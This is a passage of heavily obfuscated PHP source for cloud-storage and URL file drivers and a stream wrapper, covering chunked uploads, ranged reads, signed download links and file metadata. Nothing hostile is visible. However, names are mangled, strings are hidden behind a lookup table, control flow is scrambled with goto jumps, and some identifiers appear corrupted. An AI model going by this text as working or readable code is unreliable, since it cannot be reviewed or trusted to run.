$F“õÀÍÈĞ© = array_to_keyvalue($D™‰˜®é¤Ó, $CìÑœŸí£¯[33], $CìÑœŸí£¯[29]); $Dõåßµ­™° = array_count_values($F“õÀÍÈĞ©); $a‹¢¼ƒ‘Ö = isset($Dõåßµ­™°[$CìÑœŸí£¯[76]]) ? $Dõåßµ­™°[$CìÑœŸí£¯[76]] : 0; $C”›ãõöîî = count($F“õÀÍÈĞ©) - $a‹¢¼ƒ‘Ö; if ($f¢êç«¨ß) { $EÕÖÏ İ‹‹ += $a‹¢¼ƒ‘Ö; $F«ÓíÂõí += $C”›ãõöîî; if ($eÊåÍîòÚ§ < $f¼Ú±šãö) { break; } continue; } if ($cĞ—™ÔÁ Æ) { if ($C”›ãõöîî) { return !0; } } else { if ($a‹¢¼ƒ‘Ö) { return !0; } } if (count($D™‰˜®é¤Ó) < $f¼Ú±šãö) { break; } } if ($f¢êç«¨ß) { return array($CìÑœŸí£¯[191] => $F«ÓíÂõí, $CìÑœŸí£¯[192] => $EÕÖÏ İ‹‹); } return !1; goto c¬…Ô¶…¾; f„÷£öÃ“î: $F«ÓíÂõí = 0; $EÕÖÏ İ‹‹ = 0; $eİñ±‚æ = rtrim($aÃÈ†õ¶ĞŠ, $CìÑœŸí£¯[8]) . $CìÑœŸí£¯[8]; goto bì’ô›„†; c¬…Ô¶…¾: } public function listAll($F×š†‹Åîå) { $E¸òÂ¨é„ = array(); $this->recursionAllFiles($F×š†‹Åîå, $E¸òÂ¨é„); return $E¸òÂ¨é„; } public function canRead($A¾Ê¤ÉÁ–Ö) { return $this->exist($A¾Ê¤ÉÁ–Ö) ? !0 : !1; } public function canWrite($EÀŠ ˆ÷ì) { return $this->exist($EÀŠ ˆ÷ì) ? !0 : !1; } public function getContent($aÅñÅâí£ù) { return $this->fileSubstr($aÅñÅâí£ù, 0, -1); } public function setContent($féº¶µ´ù¸, $f™î¯®æ„º = '') { $aÏÅ¬ŠâÜØ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$f™î¯®æ„º) { $e¯Ê¡ÈãØ¨ = $this->ussRequest($féº¶µ´ù¸, $aÏÅ¬ŠâÜØ[212]); return $e¯Ê¡ÈãØ¨[$aÏÅ¬ŠâÜØ[1051]]; } $d¯°¥Â­çÚ = $this->tempFile($this->pathThis($féº¶µ´ù¸)); file_put_contents($d¯°¥Â­çÚ, $f™î¯®æ„º); if ($this->upload($féº¶µ´ù¸, $d¯°¥Â­çÚ)) { $this->tempFileRemve($d¯°¥Â­çÚ); return !0; } return !1; } public function fileSubstr($bìÉ“åßß¾, $f¯¯À“ôœ¿, $d¯İ­Â¶Ö) { $C—îò«Ìù‹ =& $_SERVER[ã®Â„Éæ¹¤]; if (!($C‹ÉöÔ¹ï‘ = $this->link($bìÉ“åßß¾))) { return !1; } $AÖäâƒë¦… = !1; if ($d¯İ­Â¶Ö > 0) { $e®ƒä“‹¾ = $f¯¯À“ôœ¿ + $d¯İ­Â¶Ö - 1; $AÖäâƒë¦… = array($C—îò«Ìù‹[1238] . $f¯¯À“ôœ¿ . $C—îò«Ìù‹[412] . $e®ƒä“‹¾); } $aÍƒ¿Ûä¬ì = url_request($C‹ÉöÔ¹ï‘, $C—îò«Ìù‹[216], !1, $AÖäâƒë¦…); return $aÍƒ¿Ûä¬ì[$C—îò«Ìù‹[711]] ? $aÍƒ¿Ûä¬ì[$C—îò«Ìù‹[1053]] : !1; } public function upload($Fßé«ğˆ‡©, $E¾¯ºôÖ«‹, $fø¯µï“Û½ = false, $cÒ²×¯êÇÍ = REPEAT_REPLACE) { goto D…Šï±‘; aˆ…½©¿ñ: $D‘øŒÙâ†² = $this->ussRequest($Fßé«ğˆ‡©, $FšƒôÇÁ µ[214], !1, $E”¶¸—ëç); return $D‘øŒÙâ†²[$FšƒôÇÁ µ[1051]] ? $this->getPathOuter($DŒ –Ô³ÀÖ) : !1; goto eĞ«ƒ¤âÓ©; c¹ëîôóÉ: if (!$D‘øŒÙâ†²[$FšƒôÇÁ µ[1051]]) { return !1; } $E•¨µ†Í¨ = $D‘øŒÙâ†²[$FšƒôÇÁ µ[1053]]; $a¡Ø°ìğ­ = 0; goto f«Ğù‡Çˆ; AÄöôãï´: $c¹ …¾Œ¹Ê = 1024 * 1024 * 10; $E”¶¸—ëç = array($FšƒôÇÁ µ[1280], $FšƒôÇÁ µ[1281] . $eââ‘ŒÉãº, $FšƒôÇÁ µ[1282], $FšƒôÇÁ µ[1283] . $c¹ …¾Œ¹Ê); $D‘øŒÙâ†² = $this->ussRequest($Fßé«ğˆ‡©, $FšƒôÇÁ µ[214], !1, $E”¶¸—ëç); goto c¹ëîôóÉ; EØÆçÛ‡¶„: do { $D–àÌ±‡Ôõ = $E•¨µ†Í¨[$FšƒôÇÁ µ[1285]]; fseek_64($eˆÇ“” ‡, $a¡Ø°ìğ­); $BñÑ„Ù­ = fread($eˆÇ“” ‡, $D–àÌ±‡Ôõ); $CÙê§µÄËœ = 0; do { $CÙê§µÄËœ++; $E•¨µ†Í¨ = $this->uploadPart($Fßé«ğˆ‡©, $E•¨µ†Í¨, $BñÑ„Ù­); } while (!$E•¨µ†Í¨ && $CÙê§µÄËœ < 3); if (!$E•¨µ†Í¨) { return !1; } $cÉºÄÇ–Å¢ = $E•¨µ†Í¨[$FšƒôÇÁ µ[1284]]; $a¡Ø°ìğ­ += $D–àÌ±‡Ôõ; } while ($cÉºÄÇ–Å¢ != -1); fclose($eˆÇ“” ‡); $E”¶¸—ëç = array($FšƒôÇÁ µ[1286], $FšƒôÇÁ µ[1287] . $E•¨µ†Í¨[$FšƒôÇÁ µ[1288]], $FšƒôÇÁ µ[1282]); goto aˆ…½©¿ñ; f«Ğù‡Çˆ: $cÉºÄÇ–Å¢ = $E•¨µ†Í¨[$FšƒôÇÁ µ[1284]]; $eˆÇ“” ‡ = fopen($E¾¯ºôÖ«‹, $FšƒôÇÁ µ[1188]); if (!$eˆÇ“” ‡) { return !1; } goto EØÆçÛ‡¶„; D…Šï±‘: $FšƒôÇÁ µ =& $_SERVER[ã®Â„Éæ¹¤]; $eââ‘ŒÉãº = IO::size($E¾¯ºôÖ«‹); if ($eââ‘ŒÉãº <= 1024 * 1024 * 200) { $B˜—ï½ê = array($FšƒôÇÁ µ[1279] . $E¾¯ºôÖ«‹); $D‘øŒÙâ†² = $this->ussRequest($Fßé«ğˆ‡©, $FšƒôÇÁ µ[214], $B˜—ï½ê); return $D‘øŒÙâ†²[$FšƒôÇÁ µ[1051]] ? $this->getPathOuter($Fßé«ğˆ‡©) : !1; } goto AÄöôãï´; eĞ«ƒ¤âÓ©: } private function uploadPart($B­“Š›óİÔ, $CÑ•ï¿ÖÖœ, &$c­ÚĞÏ°œ) { $F‚ Â‘‡â =& $_SERVER[ã®Â„Éæ¹¤]; $B¥º¦ğï¤ö = array($F‚ Â‘‡â[1289], $F‚ Â‘‡â[1287] . $CÑ•ï¿ÖÖœ[$F‚ Â‘‡â[1288]], $F‚ Â‘‡â[1290] . $CÑ•ï¿ÖÖœ[$F‚ Â‘‡â[1284]], $F‚ Â‘‡â[138] . $CÑ•ï¿ÖÖœ[$F‚ Â‘‡â[1285]]); $C»›ƒ»ØÔ‹ = $this->ussRequest($B­“Š›óİÔ, $F‚ Â‘‡â[214], $c­ÚĞÏ°œ, $B¥º¦ğï¤ö); return !$C»›ƒ»ØÔ‹[$F‚ Â‘‡â[1051]] ? $C»›ƒ»ØÔ‹[$F‚ Â‘‡â[1051]] : $C»›ƒ»ØÔ‹[$F‚ Â‘‡â[1053]]; } public function uploadFormData($aˆîÛÃ, $e„Í–ç÷…À = 3600) { return $this->uploadPolicy($aˆîÛÃ, $e„Í–ç÷…À); } public function multiUploadFormData($d…ÎòÖƒµ‘, $CÄØƒÑàª = 3600) { $FÔó¹ò¤–î =& $_SERVER[ã®Â„Éæ¹¤]; $DÆ»ß×£¿‘ = (int) $GLOBALS[$FÔó¹ò¤–î[7]][$FÔó¹ò¤–î[77]]; return $this->uploadPolicy($d…ÎòÖƒµ‘, $CÄØƒÑàª, $DÆ»ß×£¿‘); } private function uploadPolicy($bÀ¢Ì»ğ•È, $C»ÊÖİ = 3600, $c“¢è¡Ê‚§ = 0) { goto FÛ„³Á»; FÛ„³Á»: $Cè…ôĞ½ó¯ =& $_SERVER[ã®Â„Éæ¹¤]; $Bç¤«Û¥‡’ = $Cè…ôĞ½ó¯[8] . $this->bucket; $A©½¸Ïò»Î = gmdate($Cè…ôĞ½ó¯[1223]); goto dÉÓâÍµŸ; dÉÓâÍµŸ: $A—ƒ•›¤¦ = array($Cè…ôĞ½ó¯[1291] => $this->bucket, $Cè…ôĞ½ó¯[1292] => $bÀ¢Ì»ğ•È, $Cè…ôĞ½ó¯[1293] => time() + $C»ÊÖİ, $Cè…ôĞ½ó¯[1294] => $A©½¸Ïò»Î); if ($c“¢è¡Ê‚§) { $A—ƒ•›¤¦[$Cè…ôĞ½ó¯[1209]] = $c“¢è¡Ê‚§; } $aª¥šğÂŠù = base64_encode(json_encode($A—ƒ•›¤¦)); goto E”Š©ŸŞØõ; E”Š©ŸŞØõ: $EÑ½°äÈ—î = base64_encode(hash_hmac($Cè…ôĞ½ó¯[1261], "\x50\x4f\x53\x54\x26{$Bç¤«Û¥‡’}\46{$A©½¸Ïò»Î}\46{$aª¥šğÂŠù}", md5("{$this->userpass}"), !0)); $F…Š†Š¶‰ = array($Cè…ôĞ½ó¯[1131] => $aª¥šğÂŠù, $Cè…ôĞ½ó¯[1295] => "\125\120\131\x55\x4e\40{$this->username}\72{$EÑ½°äÈ—î}", $Cè…ôĞ½ó¯[169] => $this->endpoint . $Bç¤«Û¥‡’); return $F…Š†Š¶‰; goto eñÈ—áÛ…é; eñÈ—áÛ…é: } public function download($AÊŠµîÑ¹ç, $d°¢Ò°”òÀ) { goto Aå™ƒ÷¸‚”; a¿­¥îÒö: $E—ãŒš»Õ = 1024 * 200; $fƒÃ¹£Ò = fopen($A·Æí®‰¶„, $_SERVER[ã®Â„Éæ¹¤][1244]); while (!0) { $cš¶Œà‰¢Ò = $this->fileSubstr($AÊŠµîÑ¹ç, $f°•Õ¹ó÷, $E—ãŒš»Õ); if ($cš¶Œà‰¢Ò === !1) { return !1; } fwrite($fƒÃ¹£Ò, $cš¶Œà‰¢Ò); $f°•Õ¹ó÷ += $E—ãŒš»Õ; if (strlen($cš¶Œà‰¢Ò) < $E—ãŒš»Õ) { break; } } goto d•§¥›²Ãä; Aå™ƒ÷¸‚”: $A·Æí®‰¶„ = IO::getPathInner(IO::mkfile($d°¢Ò°”òÀ)); if (!($F¯½›ˆÓß³ = $this->link($AÊŠµîÑ¹ç))) { return !1; } $f°•Õ¹ó÷ = 0; goto a¿­¥îÒö; d•§¥›²Ãä: fclose($fƒÃ¹£Ò); return $d°¢Ò°”òÀ; goto D— ÅÅè½Ö; D— ÅÅè½Ö: } public function link($f±ùšª¥Â, $aŠ˜…“Ü„ = array()) { $bˆó¾ÆŒ…… =& $_SERVER[ã®Â„Éæ¹¤]; $f±ùšª¥Â = trim($f±ùšª¥Â, $bˆó¾ÆŒ……[8]); if (!empty($this->token)) { $e¨÷´—¸¿ = strtotime(date($bˆó¾ÆŒ……[1296])); $A“êÇ¼»§ = substr(md5($this->token . $bˆó¾ÆŒ……[272] . $e¨÷´—¸¿ . $bˆó¾ÆŒ……[1297] . $f±ùšª¥Â), 12, 8) . $e¨÷´—¸¿; $aŠ˜…“Ü„[] = $bˆó¾ÆŒ……[1298] . $A“êÇ¼»§; } $eèŸŸÆ´¹Ñ = !empty($aŠ˜…“Ü„) ? $bˆó¾ÆŒ……[69] . implode($bˆó¾ÆŒ……[272], $aŠ˜…“Ü„) : $bˆó¾ÆŒ……[33]; return $this->getHost() . $bˆó¾ÆŒ……[8] . $f±ùšª¥Â . $eèŸŸÆ´¹Ñ; } public function fileOut($E„¢ƒñºîĞ, $eÔçˆ¾ª¾ = false, $CÃÓáˆáîÇ = false, $c¼ ÕŸ‡Ğ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($E„¢ƒñºîĞ, $eÔçˆ¾ª¾, $CÃÓáˆáîÇ, $c¼ ÕŸ‡Ğ); } if (!$CÃÓáˆáîÇ) { $CÃÓáˆáîÇ = $this->pathThis($E„¢ƒñºîĞ); } $bâÁ½çÇëë = $eÔçˆ¾ª¾ ? array($_SERVER[ã®Â„Éæ¹¤][1299] . rawurlencode($CÃÓáˆáîÇ)) : array(); $d¹ÀˆÎÈ¶ = $this->link($E„¢ƒñºîĞ, $bâÁ½çÇëë); $this->fileOutLink($d¹ÀˆÎÈ¶); } public function fileOutServer($AñÏİÄÄ, $a¾ó£‚ëóø = false, $A‘ÜÌ¢ÕÀ = false, $c½‰öÙ = '') { parent::fileOut($AñÏİÄÄ, $a¾ó£‚ëóø, $A‘ÜÌ¢ÕÀ, $c½‰öÙ); } public function fileOutImage($c¼ößë…×œ, $BšŒÃæä’° = 250) { $fŞõî¤áÕ = $this->link($c¼ößë…×œ . $_SERVER[ã®Â„Éæ¹¤][1300] . $BšŒÃæä’°); $this->fileOutLink($fŞõî¤áÕ); } public function fileOutImageServer($b…Àæâ®ã¹, $BÄˆ–âğ´ = 250) { parent::fileOutImage($b…Àæâ®ã¹, $BÄˆ–âğ´); } public function hashMd5($D²ÙÊ¸Í) { $b¶õÍìí‹… =& $_SERVER[ã®Â„Éæ¹¤]; $aß­‹†¼”« = $this->objectMeta($D²ÙÊ¸Í); return isset($aß­‹†¼”«[$b¶õÍìí‹…[196]]) ? $aß­‹†¼”«[$b¶õÍìí‹…[196]] : !1; } public function size($e—°ãÈñÖÒ) { $Cİ…é‚ˆƒê = $this->objectMeta($e—°ãÈñÖÒ); return $Cİ…é‚ˆƒê ? $Cİ…é‚ˆƒê[$_SERVER[ã®Â„Éæ¹¤][77]] : 0; } public function info($e‰´·¡¢ ) { if ($this->isFolder($e‰´·¡¢ )) { return $this->folderInfo($e‰´·¡¢ ); } else { if ($this->isFile($e‰´·¡¢ )) { return $this->fileInfo($e‰´·¡¢ ); } } return !1; } public function exist($DæÖ¿ËË„º) { return $this->isFile($DæÖ¿ËË„º) || $this->isFolder($DæÖ¿ËË„º); } public function isFile($CùÖ¶›Å) { return !$this->isFolder($CùÖ¶›Å) && $this->objectMeta($CùÖ¶›Å); } public function isFolder($DÛÎ¶ÛŠ®ø) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][223], $DÛÎ¶ÛŠ®ø); } protected function objectMeta($dª©¼…ÓØ¦) { return $this->cacheMethod($_SERVER[ã®Â„Éæ¹¤][224], $dª©¼…ÓØ¦); } protected function _objectMeta($B‚¥•ËèØ) { goto e–½¹¥í’; dîåë›ğŞ¯: if (!$aÕÊğø¹Æ®[$fŞìÁ‚‰À•[1051]]) { return null; } $f¶¾†ÈÕË‡ = isset($aÕÊğø¹Æ®[$fŞìÁ‚‰À•[1053]]) ? $aÕÊğø¹Æ®[$fŞìÁ‚‰À•[1053]] : array(); if (!isset($f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1302]])) { return null; } goto c›Å›««¡†; c›Å›««¡†: $f¡ÑâÈÌ¦Ü = array($fŞìÁ‚‰À•[28] => get_path_this($B‚¥•ËèØ), $fŞìÁ‚‰À•[29] => isset($f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1302]]) ? $f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1302]] : null, $fŞìÁ‚‰À•[77] => isset($f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1303]]) ? $f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1303]] : null, $fŞìÁ‚‰À•[196] => isset($f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1304]]) ? $f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1304]] : null, $fŞìÁ‚‰À•[1272] => isset($f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1305]]) ? $f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1305]] : null); $f¡ÑâÈÌ¦Ü[$fŞìÁ‚‰À•[1273]] = isset($f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1306]]) ? strtotime($f¶¾†ÈÕË‡[$fŞìÁ‚‰À•[1306]]) : $f¡ÑâÈÌ¦Ü[$fŞìÁ‚‰À•[1272]]; return $f¡ÑâÈÌ¦Ü; goto C‚†ìî’¦‹; e–½¹¥í’: $fŞìÁ‚‰À• =& $_SERVER[ã®Â„Éæ¹¤]; if ($B‚¥•ËèØ == $fŞìÁ‚‰À•[33] || $B‚¥•ËèØ == $fŞìÁ‚‰À•[8]) { return array(); } $aÕÊğø¹Æ® = $this->ussRequest($B‚¥•ËèØ, $fŞìÁ‚‰À•[1301]); goto dîåë›ğŞ¯; C‚†ìî’¦‹: } protected function _isFolder($Bİ¹ÄùÛç·) { $b™‡èÍÔÙÁ =& $_SERVER[ã®Â„Éæ¹¤]; if ($Bİ¹ÄùÛç· == $b™‡èÍÔÙÁ[33] || $Bİ¹ÄùÛç· == $b™‡èÍÔÙÁ[8]) { return !0; } $F©Â§¶†Üˆ = $this->objectMeta($Bİ¹ÄùÛç·); return isset($F©Â§¶†Üˆ[$b™‡èÍÔÙÁ[29]]) && $F©Â§¶†Üˆ[$b™‡èÍÔÙÁ[29]] == $b™‡èÍÔÙÁ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($BŞµ½òºß³ = false) { } public function exist($c²îµÁ©¸™) { $D¹ÑğÅ¥¦¯ = $this->info($c²îµÁ©¸™); return $D¹ÑğÅ¥¦¯[$_SERVER[ã®Â„Éæ¹¤][188]]; } public function isFile($e®ì”ÜÊºÈ) { $CĞÄøÆ”Ğê = $this->info($e®ì”ÜÊºÈ); return $CĞÄøÆ”Ğê[$_SERVER[ã®Â„Éæ¹¤][188]]; } public function isFolder($càÀğÆÉ»Í) { return !1; } public function size($bÈã±Ş¡¸Ç) { $fÄëæò = $this->info($bÈã±Ş¡¸Ç); return $fÄëæò[$_SERVER[ã®Â„Éæ¹¤][77]]; } public function info($C³ŞƒÎŞãƒ) { return $this->infoParse($C³ŞƒÎŞãƒ); } public function infoAuth($AÅ¶¤·ËĞ) { return $this->infoParse($AÅ¶¤·ËĞ); } public function infoWithChildren($eôºç„¯Šƒ) { return $this->infoParse($eôºç„¯Šƒ); } public function infoFull($A¤•Üœíæ) { return $this->infoParse($A¤•Üœíæ); } private function infoParse($fÃ„¯‚ãÌ) { $DÏŒÂ²¸í× =& $_SERVER[ã®Â„Éæ¹¤]; $e®à´Æ¨ß = $this->header($fÃ„¯‚ãÌ); if (!$e®à´Æ¨ß || !$e®à´Æ¨ß[$DÏŒÂ²¸í×[711]]) { return !1; } $aöš’ÕôÈÂ = _get($e®à´Æ¨ß, $DÏŒÂ²¸í×[325], 0); $f£¼¤ƒºí  = array($DÏŒÂ²¸í×[28] => $e®à´Æ¨ß[$DÏŒÂ²¸í×[28]], $DÏŒÂ²¸í×[75] => $fÃ„¯‚ãÌ, $DÏŒÂ²¸í×[29] => $DÏŒÂ²¸í×[167], $DÏŒÂ²¸í×[77] => intval($aöš’ÕôÈÂ), $DÏŒÂ²¸í×[160] => get_path_ext($e®à´Æ¨ß[$DÏŒÂ²¸í×[28]]), $DÏŒÂ²¸í×[1181] => $aöš’ÕôÈÂ > 0 && $e®à´Æ¨ß[$DÏŒÂ²¸í×[1307]], $DÏŒÂ²¸í×[1182] => !1); return $f£¼¤ƒºí ; } private function header($Dµİ¹ˆÁ”“) { if (isset(self::$_cacheHeader[$Dµİ¹ˆÁ”“])) { return self::$_cacheHeader[$Dµİ¹ˆÁ”“]; } self::$_cacheHeader[$Dµİ¹ˆÁ”“] = url_header($Dµİ¹ˆÁ”“); return self::$_cacheHeader[$Dµİ¹ˆÁ”“]; } public function hashSimple($AßĞÀ§í½Ô, $a¡ç³àæ¢ = false) { goto c‰åêÆ‡İà; E´Ó‡ˆ‰ÒØ: $aƒ“ïğƒ¦ = timeFloat(); $B ß©Íè‰ = 15; for ($Aóìåñí¬ø = 0; $Aóìåñí¬ø < $C³‚ø¢¦©ğ; $Aóìåñí¬ø++) { if (timeFloat() - $aƒ“ïğƒ¦ > $B ß©Íè‰) { return !1; } $C§Ù¬§ö = $this->fileSubstr($AßĞÀ§í½Ô, $Dô‘·¥ë…ã * $Aóìåñí¬ø, $A»éÛŞ—º); if (!$C§Ù¬§ö) { return !1; } $eŞöƒª…˜ .= $C§Ù¬§ö; } goto dÖ±Œ—‡æš; c‰åêÆ‡İà: $d÷®¾ã¬—Œ =& $_SERVER[ã®Â„Éæ¹¤]; $dÂÈé¨äÌ = $this->info($AßĞÀ§í½Ô); if (!$dÂÈé¨äÌ || !$dÂÈé¨äÌ[$d÷®¾ã¬—Œ[188]]) { return !1; } goto dø”Ê‡Í‚; dø”Ê‡Í‚: $E¿æ‡á¥ = $dÂÈé¨äÌ[$d÷®¾ã¬—Œ[77]]; $A»éÛŞ—º = 200; $C³‚ø¢¦©ğ = 50; goto E„ø¸ì©³; E„ø¸ì©³: if ($E¿æ‡á¥ <= $A»éÛŞ—º * $C³‚ø¢¦©ğ) { return md5($this->fileSubstr($AßĞÀ§í½Ô, 0, $E¿æ‡á¥)) . $E¿æ‡á¥; } $Dô‘·¥ë…ã = intval($E¿æ‡á¥ / $C³‚ø¢¦©ğ); $eŞöƒª…˜ = $d÷®¾ã¬—Œ[33]; goto E´Ó‡ˆ‰ÒØ; dÖ±Œ—‡æš: $eŞöƒª…˜ .= $this->fileSubstr($AßĞÀ§í½Ô, $E¿æ‡á¥ - $A»éÛŞ—º, $A»éÛŞ—º); return md5($eŞöƒª…˜) . $E¿æ‡á¥; goto aº–ªßÀÆ; aº–ªßÀÆ: } public function getContent($A„ØÅÅ’ÕÒ) { return $this->fileSubstr($A„ØÅÅ’ÕÒ); } public function fileSubstr($DÌ¾Š†ã¹æ, $F×îË¤«Ê = 0, $c‘ÏÃô·åî = -1) { goto f‘æ²ËŠ„Ò; f‘æ²ËŠ„Ò: $Dœ£ÏŸ»ª =& $_SERVER[ã®Â„Éæ¹¤]; $C½‚ÁºŞÛ = $this->info($DÌ¾Š†ã¹æ); if (!$C½‚ÁºŞÛ || !$C½‚ÁºŞÛ[$Dœ£ÏŸ»ª[188]] && $C½‚ÁºŞÛ[$Dœ£ÏŸ»ª[77]] > 1024 * 1024 * 10) { return !1; } goto eùÍ§°Éù—; eùÍ§°Éù—: if ($c‘ÏÃô·åî === -1) { $c‘ÏÃô·åî = $C½‚ÁºŞÛ[$Dœ£ÏŸ»ª[77]]; } if ($c‘ÏÃô·åî == 0) { return $Dœ£ÏŸ»ª[33]; } $däŠù‚™æ = array($Dœ£ÏŸ»ª[1308] . $F×îË¤«Ê . $Dœ£ÏŸ»ª[737] . ($F×îË¤«Ê + $c‘ÏÃô·åî - 1)); goto Eº—¶Ÿ¦‘é; Eº—¶Ÿ¦‘é: $f«ñ¼¨Ğøí = url_request($DÌ¾Š†ã¹æ, $Dœ£ÏŸ»ª[216], !1, $däŠù‚™æ, !1, !1, 1); return $f«ñ¼¨Ğøí[$Dœ£ÏŸ»ª[1053]] ? $f«ñ¼¨Ğøí[$Dœ£ÏŸ»ª[1053]] : $Dœ£ÏŸ»ª[33]; goto a‘äÊÚ¶É«; a‘äÊÚ¶É«: } public function download($EŞ…š°¯´­, $Bí‘¥•‘ò±) { Downloader::start($EŞ…š°¯´­, $Bí‘¥•‘ò±); return $Bí‘¥•‘ò±; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Eïãˆùò§, $a—ö‡óØ¡½ = '') { goto CÈŸÌ¼·ä; E‘˜è²Îâ: return $this->info ? !0 : !1; goto Cåİòîø; bš¢Ãõ´Ÿï: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Eïãˆùò§])) { self::$_chunkBuffer[$Eïãˆùò§] = array(); } goto E‘˜è²Îâ; CÈŸÌ¼·ä: $this->info = $this->info($Eïãˆùò§); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ã®Â„Éæ¹¤][75]]; goto bš¢Ãõ´Ÿï; Cåİòîø: } function stream_read($F®ÍÜĞÙ´é) { $c˜øˆï¡Ş = $this->fileSubstr($this->pose, $F®ÍÜĞÙ´é); $this->pose += strlen($c˜øˆï¡Ş); return $c˜øˆï¡Ş; } public function stream_tell() { return $this->pose; } public function stream_seek($cŒÏºà´Ÿ­, $eàìÆ„š‹) { $CŒÇÄÂÔ›Ë =& $_SERVER[ã®Â„Éæ¹¤]; if ($eàìÆ„š‹ == SEEK_SET) { $this->pose = $cŒÏºà´Ÿ­; } else { if ($eàìÆ„š‹ == SEEK_CUR) { $this->pose += $cŒÏºà´Ÿ­; } else { if ($eàìÆ„š‹ == SEEK_END) { $this->pose = $this->info[$CŒÇÄÂÔ›Ë[77]] + intval($cŒÏºà´Ÿ­); } } } if ($cŒÏºà´Ÿ­ < 0) { $this->pose = $this->info[$CŒÇÄÂÔ›Ë[77]] + $cŒÏºà´Ÿ­; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ã®Â„Éæ¹¤][77]]; } public function stream_close() { return !0; } public function url_stat($D‹Ââå†Í¼, $Cö‘Ş‘«’Ô) { $DšáÅãÆê =& $_SERVER[ã®Â„Éæ¹¤]; $E¤´§¡ŒĞ˜ = $this->info($D‹Ââå†Í¼); return array($DšáÅãÆê[1309] => 0, $DšáÅãÆê[1310] => 0, $DšáÅãÆê[12] => 32768 + 511, $DšáÅãÆê[1311] => 0, $DšáÅãÆê[1312] => 0, $DšáÅãÆê[1313] => 0, $DšáÅãÆê[1314] => 0, $DšáÅãÆê[77] => $E¤´§¡ŒĞ˜[$DšáÅãÆê[77]], $DšáÅãÆê[1315] => $E¤´§¡ŒĞ˜[$DšáÅãÆê[1186]], $DšáÅãÆê[1273] => $E¤´§¡ŒĞ˜[$DšáÅãÆê[107]], $DšáÅãÆê[1272] => $E¤´§¡ŒĞ˜[$DšáÅãÆê[187]], $DšáÅãÆê[1316] => 0, $DšáÅãÆê[1317] => 0); } static $fileInfo = array(); public function info($A „“‹á„) { $Bºì—–ŒÁÖ = $_SERVER[ã®Â„Éæ¹¤][1318]; if (isset(self::$fileInfo[$A „“‹á„])) { return self::$fileInfo[$A „“‹á„]; } if (substr($A „“‹á„, 0, strlen($Bºì—–ŒÁÖ)) != $Bºì—–ŒÁÖ) { return !1; } self::$fileInfo[$A „“‹á„] = IO::info(substr($A „“‹á„, strlen($Bºì—–ŒÁÖ))); return self::$fileInfo[$A „“‹á„]; } public static function read($eÇ’ƒêÙ…, $B½ÇÑİÏµ, $cĞÛÏÚ å) { goto C÷Öœ¹‚¨; AÍŒò‘…§õ: return $D·µÏäßõÌ; goto d‰Î‡¾¹®õ; C÷Öœ¹‚¨: $c×¡¸‹ÄÊÖ =& $_SERVER[ã®Â„Éæ¹¤]; $fÓÛÉºÒ½Š = fopen($eÇ’ƒêÙ…, $c×¡¸‹ÄÊÖ[1188]); if (!$fÓÛÉºÒ½Š) { return $c×¡¸‹ÄÊÖ[33]; } goto Cší—²•ä‘; f´ß›Ç©ä: $bÒÎ­°¥‡ = 0; while ($bÒÎ­°¥‡ < $cĞÛÏÚ å) { $eµÓ¶ñ¾Ê´ = min($F¦®¯‡¢ª, $cĞÛÏÚ å - $bÒÎ­°¥‡); $D·µÏäßõÌ .= fread($fÓÛÉºÒ½Š, $eµÓ¶ñ¾Ê´); $bÒÎ­°¥‡ += $eµÓ¶ñ¾Ê´; } fclose($fÓÛÉºÒ½Š); goto AÍŒò‘…§õ; Cší—²•ä‘: $F¦®¯‡¢ª = 8192; fseek($fÓÛÉºÒ½Š, $B½ÇÑİÏµ, SEEK_SET); $D·µÏäßõÌ = $c×¡¸‹ÄÊÖ[33]; goto f´ß›Ç©ä; d‰Î‡¾¹®õ: } public function fileSubstr($B‰ê‡øƒÆ¿, $EñÆˆÓ¤˜‡) { goto eˆ‘ø°; c›ÉÙ¹“Ç¨: if ($B‰ê‡øƒÆ¿ + $EñÆˆÓ¤˜‡ > $e§¾“ÚåÊ) { $EñÆˆÓ¤˜‡ = $e§¾“ÚåÊ - $B‰ê‡øƒÆ¿; } if ($EñÆˆÓ¤˜‡ <= 0) { return $a£ø»Í§²æ[33]; } if ($B‰ê‡øƒÆ¿ < 0 || $B‰ê‡øƒÆ¿ >= $e§¾“ÚåÊ || $EñÆˆÓ¤˜‡ <= 0 || $EñÆˆÓ¤˜‡ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\151\x6c\x65\x52\x65\x61\x64\x20\x65\x72\x72\157\162\41\40\163\164\141\162\164\75{$B‰ê‡øƒÆ¿}\73\x6c\145\156\147\164\150\75{$EñÆˆÓ¤˜‡}\73\40\x73\151\172\145\75{$e§¾“ÚåÊ}\x3b"); } goto fÓòÒÕˆœ¬; fÕÃíÈ¸«æ: $B®³’ïë»« = 0; $EæöŠ²Ä“† = 0; $Aö‚¤ÒŸ“â = $a£ø»Í§²æ[33]; goto bùÉğˆ¤°; A­„ëÉµ°à: $dÊ‘²ñÏó = $EñÆˆÓ¤˜‡; if ($B‰ê‡øƒÆ¿ < 0) { $B‰ê‡øƒÆ¿ = $e§¾“ÚåÊ + $B‰ê‡øƒÆ¿; } if ($EñÆˆÓ¤˜‡ === !1) { $EñÆˆÓ¤˜‡ = $e§¾“ÚåÊ - $B‰ê‡øƒÆ¿; } goto c›ÉÙ¹“Ç¨; cÅ¸®±„¼â: $CƒœØ‰ÙèØ = ceil(($B‰ê‡øƒÆ¿ + 